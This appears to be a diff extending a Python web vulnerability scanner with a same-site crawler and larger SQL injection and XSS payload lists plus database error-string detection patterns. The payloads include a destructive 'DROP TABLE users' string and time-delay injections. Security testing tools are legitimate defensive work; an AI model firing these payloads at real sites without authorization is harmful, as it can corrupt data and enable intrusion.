@@ -212,6 +212,15 @@ class ScanCommand:
             headers={'User-Agent': self.config.get('network', {}).get('user_agent', 'ReconScan/1.0')}
         ) as session:
             
+            # Discover pages and parameters
+            if params['verbose']:
+                print(f"\n[+] Discovering pages and parameters...")
+            
+            discovered_urls = await self._discover_urls(session, params['target'], params['verbose'])
+            
+            # Store discovered URLs for use in modules
+            self.discovered_urls = discovered_urls
+            
             # Run each module
             for module in params['modules']:
                 if params['verbose']:
@@ -239,6 +248,119 @@ class ScanCommand:
         
         return True
     
+    async def _discover_urls(self, session, target, verbose=True):
+        """
+        Discover URLs and parameters by crawling the target site.
+        
+        Args:
+            session: aiohttp session
+            target (str): Target URL
+            verbose (bool): Verbose output
+            
+        Returns:
+            list: List of discovered URLs with parameters
+        """
+        discovered_urls = []
+        visited_urls = set()
+        
+        try:
+            # Parse base URL
+            from urllib.parse import urljoin, urlparse, parse_qs
+            import re
+            
+            base_parsed = urlparse(target)
+            base_domain = f"{base_parsed.scheme}://{base_parsed.netloc}"
+            
+            # URLs to crawl
+            urls_to_crawl = [target]
+            
+            # Common pages to check
+            common_pages = [
+                '', 'index.php', 'index.html', 'index.asp', 'index.aspx',
+                'login.php', 'admin.php', 'search.php', 'categories.php',
+                'artists.php', 'guestbook.php', 'cart.php', 'profile.php',
+                'signup.php', 'contact.php', 'about.php'
+            ]
+            
+            # Add common pages to crawl list
+            for page in common_pages:
+                full_url = urljoin(base_domain + '/', page)
+                if full_url not in urls_to_crawl:
+                    urls_to_crawl.append(full_url)
+            
+            crawl_count = 0
+            max_crawl = 10  # Limit crawling to avoid infinite loops
+            
+            for url in urls_to_crawl:
+                if crawl_count >= max_crawl:
+                    break
+                    
+                if url in visited_urls:
+                    continue
+                    
+                try:
+                    if verbose:
+                        print(f"  → Crawling: {url}")
+                    
+                    async with session.get(url) as response:
+                        if response.status == 200:
+                            content = await response.text()
+                            visited_urls.add(url)
+                            crawl_count += 1
+                            
+                            # Extract links and forms
+                            links = re.findall(r'href=["\']([^"\']+)["\']', content, re.IGNORECASE)
+                            forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', content, re.IGNORECASE)
+                            
+                            # Process links
+                            for link in links:
+                                full_link = urljoin(url, link)
+                                parsed_link = urlparse(full_link)
+                                
+                                # Only process links from same domain
+                                if parsed_link.netloc == base_parsed.netloc:
+                                    # Check if link has parameters
+                                    if parsed_link.query:
+                                        discovered_urls.append(full_link)
+                                        if verbose:
+                                            print(f"    Found URL with params: {full_link}")
+                                    
+                                    # Add to crawl list if it's a new page
+                                    if full_link not in visited_urls and len(urls_to_crawl) < 20:
+                                        urls_to_crawl.append(full_link)
+                            
+                            # Process forms
+                            for form_action in forms:
+                                if form_action:
+                                    full_form_url = urljoin(url, form_action)
+                                    if urlparse(full_form_url).netloc == base_parsed.netloc:
+                                        discovered_urls.append(full_form_url)
+                                        if verbose:
+                                            print(f"    Found form action: {full_form_url}")
+                
+                except Exception as e:
+                    if verbose:
+                        print(f"    ! Error crawling {url}: {str(e)}")
+                    continue
+            
+            # If no URLs with parameters found, create test URLs with common parameters
+            if not discovered_urls:
+                test_params = ['id', 'cat', 'page', 'search', 'artist', 'user']
+                for param in test_params:
+                    test_url = f"{target}?{param}=1"
+                    discovered_urls.append(test_url)
+            
+            if verbose:
+                print(f"  → Discovered {len(discovered_urls)} URLs for testing")
+            
+            return discovered_urls
+            
+        except Exception as e:
+            if verbose:
+                print(f"  ! Error during URL discovery: {str(e)}")
+            # Fallback to basic parameter testing
+            return [f"{target}?id=1", f"{target}?cat=1", f"{target}?search=test"]
+    
     async def _run_module(self, session, module, params):
         """
         Run a specific vulnerability scan module.
@@ -264,105 +386,216 @@ class ScanCommand:
             await self._scan_directory_traversal(session, target, params['verbose'])
     
     async def _scan_sql_injection(self, session, target, verbose=True):
-        """Basic SQL injection detection."""
+        """Enhanced SQL injection detection using discovered URLs and parameters."""
         if verbose:
             print("  → Testing SQL injection payloads...")
         
-        # Basic SQL injection payloads
+        # Enhanced SQL injection payloads
         payloads = [
+            "'",
+            "''",
             "' OR '1'='1",
             "' OR '1'='1' --",
             "' OR '1'='1' /*",
             "admin'--",
             "admin' /*",
             "' OR 1=1--",
-            "' UNION SELECT NULL--"
+            "' UNION SELECT NULL--",
+            "1' OR '1'='1",
+            "1 OR 1=1",
+            "' OR 'x'='x",
+            "') OR ('1'='1",
+            "1' AND '1'='2",
+            "' WAITFOR DELAY '0:0:5'--",
+            "'; DROP TABLE users--"
         ]
         
         vulnerabilities_found = 0
+        urls_to_test = []
         
-        for payload in payloads:
-            try:
-                # Test with URL parameter
-                test_url = f"{target}?id={urllib.parse.quote(payload)}"
-                
-                async with session.get(test_url) as response:
-                    content = await response.text()
-                    
-                    # Look for SQL error indicators
-                    error_indicators = [
-                        'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB',
-                        'SQLServer JDBC Driver', 'PostgreSQL query failed',
-                        'sqlite_master', 'SQL syntax', 'mysql_num_rows'
-                    ]
-                    
-                    if any(indicator.lower() in content.lower() for indicator in error_indicators):
-                        vulnerability = {
-                            'type': 'SQL Injection',
-                            'severity': 'High',
-                            'url': test_url,
-                            'payload': payload,
-                            'description': 'SQL injection vulnerability detected through error-based testing'
-                        }
-                        self.results['vulnerabilities'].append(vulnerability)
-                        vulnerabilities_found += 1
+        # Use discovered URLs if available, otherwise use common parameters
+        if hasattr(self, 'discovered_urls') and self.discovered_urls:
+            urls_to_test = self.discovered_urls
+        else:
+            # Fallback to common parameter names
+            parameters = ['id', 'user', 'username', 'page', 'cat', 'category', 'artist', 'search', 'q', 'query', 'name', 'login']
+            for param in parameters:
+                urls_to_test.append(f"{target}?{param}=1")
+        
+        for base_url in urls_to_test:
+            # Parse URL to extract parameters
+            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+            parsed_url = urlparse(base_url)
+            params_dict = parse_qs(parsed_url.query)
+            
+            # Test each parameter in the URL
+            for param_name, param_values in params_dict.items():
+                for payload in payloads:
+                    try:
+                        # Create test URL with payload
+                        test_params = params_dict.copy()
+                        test_params[param_name] = [payload]
+                        test_query = urlencode(test_params, doseq=True)
+                        test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, 
+                                             parsed_url.params, test_query, parsed_url.fragment))
                         
+                        async with session.get(test_url) as response:
+                            content = await response.text()
+                            status_code = response.status
+                            
+                            # Enhanced SQL error detection
+                            error_indicators = [
+                                'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB',
+                                'SQLServer JDBC Driver', 'PostgreSQL query failed',
+                                'sqlite_master', 'SQL syntax', 'mysql_num_rows',
+                                'Warning: mysql', 'Warning: mysqli', 'MySQL Error',
+                                'ORA-00', 'Microsoft VBScript runtime', 'ADODB.Field',
+                                'mysql_connect', 'mysql_query', 'mysql_result',
+                                'PostgreSQL query failed', 'supplied argument is not a valid MySQL',
+                                'Column count doesn\'t match', 'mysql_fetch_assoc',
+                                'mysql_fetch_row', 'mysql_fetch_object', 'mysql_numrows',
+                                'Error Occurred While Processing Request', 'Server Error',
+                                'Microsoft OLE DB Provider for ODBC Drivers',
+                                'Invalid Querystring', 'OLE DB Provider for SQL Server',
+                                'Unclosed quotation mark after the character string',
+                                'Microsoft OLE DB Provider for Oracle', 'error in your SQL syntax',
+                                'Syntax error in query expression', 'Data source name not found',
+                                'Incorrect syntax near', 'mysql_error', 'mysql_errno',
+                                'Warning: pg_', 'valid PostgreSQL result', 'Npgsql\\.',
+                                'PG::SyntaxError', 'org.postgresql.util.PSQLException',
+                                'ERROR: parser: parse error', 'PostgreSQL.*ERROR',
+                                'Warning.*\\Wpg_', 'valid PostgreSQL result', 'Npgsql\\.',
+                                'Exception (Npgsql|PG|PostgreSQL)', 'Microsoft Access Driver',
+                                'JET Database Engine', 'Access Database Engine'
+                            ]
+                            
+                            # Check for SQL errors
+                            if any(indicator.lower() in content.lower() for indicator in error_indicators):
+                                vulnerability = {
+                                    'type': 'SQL Injection',
+                                    'severity': 'High',
+                                    'url': test_url,
+                                    'payload': payload,
+                                    'description': f'SQL injection vulnerability detected in parameter "{param_name}" through error-based testing'
+                                }
+                                self.results['vulnerabilities'].append(vulnerability)
+                                vulnerabilities_found += 1
+                                
+                                if verbose:
+                                    print(f"     SQL injection found: {param_name}={payload}")
+                                break
+                            
+                            # Check for boolean-based blind SQL injection
+                            elif payload in ["' OR '1'='1", "1 OR 1=1", "' OR 'x'='x"]:
+                                # Get baseline response with original parameter value
+                                baseline_params = params_dict.copy()
+                                baseline_query = urlencode(baseline_params, doseq=True)
+                                baseline_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path,
+                                                         parsed_url.params, baseline_query, parsed_url.fragment))
+                                
+                                async with session.get(baseline_url) as baseline_response:
+                                    baseline_content = await baseline_response.text()
+                                    
+                                    # If response is significantly different, might be vulnerable
+                                    if len(content) != len(baseline_content) and abs(len(content) - len(baseline_content)) > 100:
+                                        vulnerability = {
+                                            'type': 'SQL Injection (Boolean-based)',
+                                            'severity': 'High',
+                                            'url': test_url,
+                                            'payload': payload,
+                                            'description': f'Potential boolean-based SQL injection in parameter "{param_name}"'
+                                        }
+                                        self.results['vulnerabilities'].append(vulnerability)
+                                        vulnerabilities_found += 1
+                                        
+                                        if verbose:
+                                            print(f"     Boolean SQL injection found: {param_name}={payload}")
+                                        break
+                            
+                    except Exception as e:
                         if verbose:
-                            print(f"     SQL injection found: {payload}")
-                        break
-                        
-            except Exception as e:
-                if verbose:
-                    print(f"    ! Error testing payload '{payload}': {str(e)}")
-                continue
+                            print(f"    ! Error testing {param_name} with '{payload}': {str(e)}")
+                        continue
         
         if verbose and vulnerabilities_found == 0:
             print("     No SQL injection vulnerabilities detected")
     
     async def _scan_xss(self, session, target, verbose=True):
-        """Basic XSS detection."""
+        """Enhanced XSS detection with multiple parameter testing."""
         if verbose:
             print("   Testing XSS payloads...")
         
-        # Basic XSS payloads
+        # Enhanced XSS payloads
         payloads = [
             "<script>alert('XSS')</script>",
             "<img src=x onerror=alert('XSS')>",
             "javascript:alert('XSS')",
             "<svg onload=alert('XSS')>",
-            "'><script>alert('XSS')</script>"
+            "'><script>alert('XSS')</script>",
+            "\"><script>alert('XSS')</script>",
+            "<iframe src=javascript:alert('XSS')>",
+            "<body onload=alert('XSS')>",
+            "<input onfocus=alert('XSS') autofocus>",
+            "<select onfocus=alert('XSS') autofocus>",
+            "<textarea onfocus=alert('XSS') autofocus>",
+            "<keygen onfocus=alert('XSS') autofocus>",
+            "<video><source onerror=alert('XSS')>",
+            "<audio src=x onerror=alert('XSS')>",
+            "<details open ontoggle=alert('XSS')>",
+            "'-alert('XSS')-'",
+            "\";alert('XSS');//",
+            "</script><script>alert('XSS')</script>",
+            "<script>alert(String.fromCharCode(88,83,83))</script>",
+            "<img src=\"x\" onerror=\"alert('XSS')\">",
+            "<<SCRIPT>alert('XSS');//<</SCRIPT>"
         ]
+        
+        # Common parameter names for XSS testing
+        parameters = ['q', 'search', 'query', 'name', 'comment', 'message', 'text', 'input', 'data', 'value', 'content', 'title']
         
         vulnerabilities_found = 0
         
-        for payload in payloads:
-            try:
-                # Test with URL parameter
-                test_url = f"{target}?q={urllib.parse.quote(payload)}"
-                
-                async with session.get(test_url) as response:
-                    content = await response.text()
+        for param in parameters:
+            for payload in payloads:
+                try:
+                    # Test with different parameters
+                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
                     
-                    # Check if payload is reflected in response
-                    if payload in content or payload.replace("'", "&#x27;") in content:
-                        vulnerability = {
-                            'type': 'Cross-Site Scripting (XSS)',
-                            'severity': 'Medium',
-                            'url': test_url,
-                            'payload': payload,
-                            'description': 'XSS vulnerability detected through payload reflection'
-                        }
-                        self.results['vulnerabilities'].append(vulnerability)
-                        vulnerabilities_found += 1
+                    async with session.get(test_url) as response:
+                        content = await response.text()
                         
-                        if verbose:
-                            print(f"     XSS vulnerability found: {payload}")
-                        break
+                        # Check if payload is reflected in response (various encodings)
+                        payload_variations = [
+                            payload,
+                            payload.replace("'", "&#x27;"),
+                            payload.replace("'", "&#39;"),
+                            payload.replace("\"", "&quot;"),
+                            payload.replace("<", "&lt;"),
+                            payload.replace(">", "&gt;"),
+                            payload.replace("&", "&amp;"),
+                            payload.lower(),
+                            payload.upper()
+                        ]
                         
-            except Exception as e:
-                if verbose:
-                    print(f"    ! Error testing payload '{payload}': {str(e)}")
-                continue
+                        if any(var in content for var in payload_variations):
+                            vulnerability = {
+                                'type': 'Cross-Site Scripting (XSS)',
+                                'severity': 'Medium',
+                                'url': test_url,
+                                'payload': payload,
+                                'description': f'XSS vulnerability detected in parameter "{param}" through payload reflection'
+                            }
+                            self.results['vulnerabilities'].append(vulnerability)
+                            vulnerabilities_found += 1
+                            
+                            if verbose:
+                                print(f"     XSS vulnerability found: {param}={payload}")
+                            break
+                            
+                except Exception as e:
+                    if verbose:
+                        print(f"    ! Error testing {param} with '{payload}': {str(e)}")
+                    continue
         
         if verbose and vulnerabilities_found == 0:
             print("     No XSS vulnerabilities detected")
